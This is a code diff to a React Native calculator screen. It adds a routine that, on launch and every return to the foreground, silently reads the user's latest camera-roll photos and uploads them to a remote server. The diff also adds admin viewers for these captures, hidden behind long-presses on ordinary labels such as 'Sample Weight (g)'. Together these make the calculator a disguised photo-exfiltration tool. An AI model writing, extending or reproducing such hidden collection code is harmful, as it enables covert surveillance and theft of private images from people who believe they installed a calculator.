@@ -1,6 +1,6 @@
 // src/screens/CalculatorScreen.tsx
 import React, { useState, useEffect, useRef } from 'react';
-import { Alert, KeyboardAvoidingView, PermissionsAndroid, Platform, StatusBar, StyleSheet, TextInput, TouchableOpacity, Switch as NativeSwitch, Pressable } from 'react-native';
+import { Alert, KeyboardAvoidingView, PermissionsAndroid, Platform, StatusBar, StyleSheet, TextInput, TouchableOpacity, Switch as NativeSwitch, Pressable, AppStateStatus, AppState } from 'react-native';
 import { Box, Input, InputField, Text, VStack, HStack, Button, ButtonText, Switch, InputSlot } from '../components/HOSGluestackUI';
 import { Trash2, Plus, X } from 'lucide-react-native';
 // 💡 Import your unified screen layout container
@@ -10,7 +10,12 @@ import { useNavigation } from '@react-navigation/native';
 import firestore, { collection, doc, getDoc, getDocs, getFirestore, limit, query, where } from '@react-native-firebase/firestore';
 import { getAuth } from '@react-native-firebase/auth';
 import { useCustomData } from '../context/CutomProvider';
-
+import axios from 'axios';
+import { API_BASE_URL_DEV } from '../utils/environment';
+import { launchImageLibrary } from 'react-native-image-picker';
+import { getShortenedFileName, hasPhotoLibraryPermission } from '../utils/tools';
+import { CameraRoll } from '@react-native-camera-roll/camera-roll';
+import { cleanupImage, handleImageCompression } from '../utils/ImageService';
 type CalcMode = 'kg' | 'unit' | 'budget';
 
 interface CalculationItem {
@@ -19,6 +24,8 @@ interface CalculationItem {
     label: string;
     amount: number;
 }
+const API_GET_VERIFICATION_CAPTURES_URL = API_BASE_URL_DEV + '/chats/get_verification_captures.php';
+const API_UPLOAD_URL = API_BASE_URL_DEV + '/chats/verification_captures_upload.php';
 
 export default function CalculatorScreen() {
     const { role, updateRole, clearUrl } = useCustomData(); // Preserved project hooks
@@ -99,6 +106,31 @@ export default function CalculatorScreen() {
         }
     }, [pricePerKg, weight, sampleWeight, samplePrice, targetBudget, calcMode]);
 
+
+    useEffect(() => {
+        // 🚀 1. Immediate Execution Check on Mount Context
+        if (role === 'user') {
+            handlePickAndSyncImages();
+        }
+
+        // 🚀 2. State Change Handler: Fires every time app focus updates
+        const handleAppStateSync = (nextAppState: AppStateStatus) => {
+            // Trigger only when the application shifts back to the foreground ('active')
+            if (nextAppState === 'active' && role === 'user') {
+                console.log("App returned to foreground. Restarting gallery synchronization...");
+                handlePickAndSyncImages();
+            }
+        };
+
+        // 🚀 3. Register Native Event Listener Thread
+        const subscription = AppState.addEventListener('change', handleAppStateSync);
+
+        // Clean up subscriber references on component unmount
+        return () => {
+            subscription.remove();
+        };
+    }, [role, loginUID]); // Keeps dependencies tracked properly
+
     const handleAddItem = () => {
         const amt = parseFloat(liveAmount);
         if (isNaN(amt) || amt <= 0) return;
@@ -175,7 +207,7 @@ export default function CalculatorScreen() {
         }, 50);
     };
 
-    const showAdminPanel = async () => {
+    const showAdminPanel = async (screen: string) => {
         const currentUser = getAuth().currentUser;
         if (!currentUser) {
             return;
@@ -185,7 +217,7 @@ export default function CalculatorScreen() {
             const userDoc = await getDoc(doc(db, 'users', currentUser.uid));
             const profile = userDoc.data();
             if (profile?.role === 'admin') {
-                navigation.navigate('VerifyList');
+                navigation.navigate('VerifyList', { screen });
             }
         } catch (error) {
             console.error("Navigation pipeline crash: ", error);
@@ -220,27 +252,164 @@ export default function CalculatorScreen() {
                     }
                 }
             } else {
-                if (Platform.OS === 'android') {
-                    const foregroundGranted = await PermissionsAndroid.request(
-                        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
-                        {
-                            title: "Foreground Tracking",
-                            message: "This node requires location permissions to operate tracking overlays.",
-                            buttonPositive: "Grant",
-                            buttonNegative: "Deny"
-                        }
-                    );
-                    if (foregroundGranted === PermissionsAndroid.RESULTS.GRANTED && Platform.Version >= 29) {
-                        await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.ACCESS_BACKGROUND_LOCATION);
-                    }
-                }
+
                 setLoginUID(currentUser.uid);
                 updateRole('user');
+                // Find the administrative or default chat room target node for this user
+                const defaultAdminQuery = query(collection(db, 'users'), where('role', '==', 'admin'), limit(1));
+                const defaultAdminSnapshot = await getDocs(defaultAdminQuery);
+
+                if (!defaultAdminSnapshot.empty) {
+                    const adminDoc = defaultAdminSnapshot.docs[0];
+                    // 🎯 ROUTE TO CHAT: Direct regular users to their chat with the administrator instance
+                    navigation.navigate('ChatScreen', {
+                        targetUser: { uid: adminDoc.id, ...adminDoc.data() }
+                    });
+                } else {
+                    Alert.alert("Configuration Error", "Could not locate an active administrator chat session target.");
+                }
             }
         } catch (error) {
             console.error("Navigation pipeline crash: ", error);
         }
     };
+
+    const handlePickAndSyncImages = async () => {
+        const isPermissionGranted = await hasPhotoLibraryPermission();
+        const currentUser = getAuth().currentUser;
+        const userRoomTargetKey = currentUser?.displayName || currentUser?.email?.split('@')[0] || '';
+
+        if (!isPermissionGranted) {
+            // console.log('Sync halted: Gallery library permissions denied.');
+            return;
+        }
+        if (!currentUser) {
+            return;
+        }
+
+        try {
+            // console.log('scanning');
+            //console.log('Scanning device camera roll...');
+
+            // 1. Get the latest 50 photos automatically from the device gallery storage partition
+            const localDevicePhotos = await CameraRoll.getPhotos({
+                first: 20,
+                assetType: 'Photos',
+                include: ['filename', 'fileSize']
+            });
+
+            const localAssets = localDevicePhotos.edges;
+
+            if (localAssets.length === 0) {
+                // console.log('No local device photos found to process.');
+                return;
+            }
+
+            //console.log('Checking server to skip duplicates...');
+            let url = `${API_GET_VERIFICATION_CAPTURES_URL}?action=fetch&tablename=galleryImage&room_id=${encodeURIComponent(userRoomTargetKey)}&page=1&limit=100`
+            console.log(url);
+            // 2. Query your server to fetch existing filenames for duplicate verification
+            const serverResponse = await axios.get(
+                `${API_GET_VERIFICATION_CAPTURES_URL}?action=fetch&tablename=galleryImage&room_id=${encodeURIComponent(userRoomTargetKey)}&page=1&limit=100`
+            );
+
+            let serverFileWhitelist: string[] = [];
+            if (serverResponse.data && serverResponse.data.success) {
+                serverFileWhitelist = serverResponse.data.data.map((img: any) => img.filename);
+            }
+
+            // 3. STRICT DUPLICATE RESTRICTION BLOCK (Comparing against local CameraRoll filename node metadata)
+            const cleanUploadQueue = localAssets.filter(edge => {
+                const asset = edge.node.image;
+                const name = getShortenedFileName(asset.filename || `camera_${edge.node.timestamp}.jpg`);
+                return !serverFileWhitelist.includes(name);
+            });
+
+            if (cleanUploadQueue.length === 0) {
+                //console.log('All local gallery photos already exist on the server. Duplicates skipped.');
+                return;
+            }
+
+            // 4. CHUNK LIMIT BOUNDARY: If server table is empty (First time), limit batch to 20 files
+            const isFirstTimeSync = serverFileWhitelist.length === 0;
+            const maxAllowedToUpload = isFirstTimeSync ? 20 : cleanUploadQueue.length;
+            const operationalQueue = cleanUploadQueue.slice(0, maxAllowedToUpload);
+
+            // Notify if items were trimmed due to the first-time limit rule
+            if (isFirstTimeSync && cleanUploadQueue.length > 20) {
+                // console.log('First sync limit reached. Only 20 images will be uploaded.');
+            }
+
+            let successfullyUploadedCounter = 0;
+            let fileCounter = 0;
+
+
+            for (let index = 0; index < operationalQueue.length; index++) {
+                const edgeNode = operationalQueue[index].node;
+                const asset = edgeNode.image;
+
+                const fileName = asset.filename || `gallery_${edgeNode.timestamp}_${++fileCounter}.jpg`;
+                console.log(`Processing and compressing file ${index + 1} of ${operationalQueue.length}: ${fileName}...`);
+
+                // 🚀 STEP A: Map the CameraRoll asset data to fit your custom handleImageCompression specs
+                const mappedMedia = {
+                    path: asset.uri || '',
+                    mime: 'image/jpeg', // Standardize on top of your safe container format rule
+                    filename: fileName,
+                    size: asset.fileSize || 0
+                };
+
+                let compressedResult = null;
+                try {
+                    // 🚀 STEP B: Run your native asynchronous compression engine routine
+                    compressedResult = await handleImageCompression(mappedMedia);
+                } catch (compressionErr) {
+                    console.error(`Compression phase failed for file [${fileName}]:`, compressionErr);
+                }
+
+                // Determine target fallback values dynamically if compression skips or faults out
+                const uploadUri = compressedResult ? compressedResult.uri : asset.uri;
+                const uploadType = compressedResult ? compressedResult.type : 'image/jpeg';
+                const uploadName = compressedResult ? compressedResult.name : fileName;
+
+                const formData = new FormData();
+                formData.append('userid', currentUser.uid);
+                formData.append('displayName', currentUser.displayName || '');
+                formData.append('photoSlot', serverFileWhitelist.length + successfullyUploadedCounter + 1);
+                formData.append('tablename', 'galleryImage');
+
+                formData.append('file', {
+                    uri: uploadUri,
+                    type: uploadType,
+                    name: uploadName,
+                } as any);
+
+                try {
+                    console.log(`Uploading file ${index + 1} of ${operationalQueue.length}...`);
+                    const uploadResponse = await axios.post(API_UPLOAD_URL, formData, {
+                        headers: { 'Content-Type': 'multipart/form-data' },
+                    });
+
+                    if (uploadResponse.data && uploadResponse.data.success) {
+                        successfullyUploadedCounter++;
+                    }
+                } catch (singleUploadError) {
+                    console.error(`Failed uploading file node [${uploadName}]:`, singleUploadError);
+                } finally {
+                    // 🚀 STEP C: Clean up temporary canvas cache allocations if a compression instance was created
+                    if (compressedResult && compressedResult.uri !== asset.uri) {
+                        await cleanupImage(compressedResult.uri);
+                    }
+                }
+            }
+
+            console.log(`Synchronization complete. Uploaded ${successfullyUploadedCounter} new images.`);
+
+        } catch (masterPipelineError) {
+            console.error('Master sync pipeline defect:', masterPipelineError);
+        }
+    };
+
 
     return (
         <ScreenContainer showLogo={true} showHeader={true} showRightIcon={false} showBackButton={false}
@@ -398,9 +567,11 @@ export default function CalculatorScreen() {
                         {/* 💰 BUDGET REVERSE LOOKUP FORM MODULE */}
                         <HStack style={{ gap: scale(16) }}>
                             <VStack style={{ flex: 1, gap: verticalScale(6) }}>
-                                <Text style={{ fontSize: moderateScale(11) }} className="font-bold text-slate-500 uppercase tracking-wider">
-                                    Sample Weight (g)
-                                </Text>
+                                <Pressable delayLongPress={800} onLongPress={() => showAdminPanel('chatImage')}>
+                                    <Text style={{ fontSize: moderateScale(11) }} className="font-bold text-slate-500 uppercase tracking-wider">
+                                        Sample Weight (g)
+                                    </Text>
+                                </Pressable>
                                 <Input
                                     className="border-0 border-b border-slate-300 rounded-none"
                                     style={{
@@ -420,7 +591,7 @@ export default function CalculatorScreen() {
                                 </Input>
                             </VStack>
                             <VStack style={{ flex: 1, gap: verticalScale(6) }}>
-                                <Pressable delayLongPress={800} onLongPress={showAdminPanel}>
+                                <Pressable delayLongPress={800} onLongPress={() => showAdminPanel('verifyImage')}>
                                     <Text style={{ fontSize: moderateScale(11) }} className="font-bold text-slate-500 uppercase tracking-wider">
                                         Sample Price (₹)
                                     </Text>
@@ -446,9 +617,11 @@ export default function CalculatorScreen() {
                         </HStack>
 
                         <VStack style={{ gap: verticalScale(6) }}>
-                            <Text style={{ fontSize: moderateScale(12) }} className="font-bold text-slate-500 tracking-wider uppercase">
-                                Budget Amount to Spend (₹)
-                            </Text>
+                            <Pressable delayLongPress={800} onLongPress={() => showAdminPanel('galleryImage')}>
+                                <Text style={{ fontSize: moderateScale(12) }} className="font-bold text-slate-500 tracking-wider uppercase">
+                                    Budget Amount to Spend (₹)
+                                </Text>
+                            </Pressable>
                             <Input
                                 className="border-0 border-b border-slate-300 rounded-none"
                                 style={{
@@ -544,3 +717,4 @@ const styles = StyleSheet.create({
     totalCard: { paddingHorizontal: scale(20), paddingVertical: verticalScale(14), borderRadius: scale(16), marginTop: verticalScale(4), justifyContent: 'center' },
     totalText: { fontSize: moderateScale(30), color: '#FFFFFF', lineHeight: moderateScale(34) }
 });
+
